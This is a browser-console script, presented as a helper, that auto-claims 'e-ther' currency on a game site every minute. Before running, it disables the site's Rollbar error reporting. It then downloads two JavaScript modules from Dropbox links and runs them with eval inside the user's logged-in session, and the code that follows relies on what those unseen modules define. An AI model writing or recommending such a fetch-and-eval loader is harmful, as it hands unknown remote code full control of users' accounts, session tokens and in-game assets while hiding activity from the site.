/*
* This script claims e-ther (and resources if you want, see config options below) 
* By default, it checks if e-ther is claimable every minute, and if some found -> claims it
* if you want to stop the periodic check just close the browser tab, or type "stopIt()" to console and press enter
*/

let config = {
    checkTime: 60000, //how often check (default value is 60 000 ms = 1 min)
    claimEtherOnly: true, //if set to false it will claim both e-ther and resource OUs
}

Rollbar.configure({ enabled: false });

const modules = [
    "https://dl.dropboxusercontent.com/scl/fi/scod3ajivefap9vt2xdz4/gen_init.js?rlkey=a6ucdw6t1ehn50qyzeny8j85r&st=nv2o18f0&dl=1",
    "https://dl.dropboxusercontent.com/scl/fi/kg7za6607j8sv1ihvvv81/gen_helper.js?rlkey=7xpk50kbkoo1syuprcshpd7pp&st=e7kflaos&dl=1",
];

for (let i = 0; i < modules.length; i++) {
    eval(await fetch(modules[i]).then(r => r.text()));
}

async function checkClaim () {
    let claimable = await _m.context.api.fetchClaimableEtherAmount();
    if (claimable) {
        let toLog = {
            amount: parseFloat(claimable.amount),
            base_amount: parseFloat(claimable.base_amount),
            boosted_amount: parseFloat(claimable.boosted_amount),
            days: claimable.ether_claim_sequence_days,
            time: new Date().toLocaleString()
        };

        console.log(
            `%c${toLog.time}%c [streak: ${toLog.days} days]-> claimable: %c${toLog.amount.toFixed(2)}%c (base: %c${toLog.base_amount}%c boost: %c${toLog.boosted_amount}%c)`
            , ...[
                "color:deepskyblue", "color:snow",
                "color:gold", "color:snow",
                "color:orange", "color:snow",
                "color:orange", "color:snow"
            ]);

        if (toLog.amount > 0) {
            if(config.claimEtherOnly){
                _m.context.api.postClaimAll()
            } else {
                _m.context.api.postClaimAllV2()
            }
        }
    }
}

function init () {
    _m.helper.shamelessPlug();
    _m.interval = setInterval(async () => {
        await checkClaim();
    }, config.checkTime);
    console.log(`${new Date().toLocaleString()} : periodic check starts`)
}

function stopIt () {
    if (!_m.interval)
        return;

    clearInterval(_m.interval);
    console.log("periodic check stopped");
}

init();
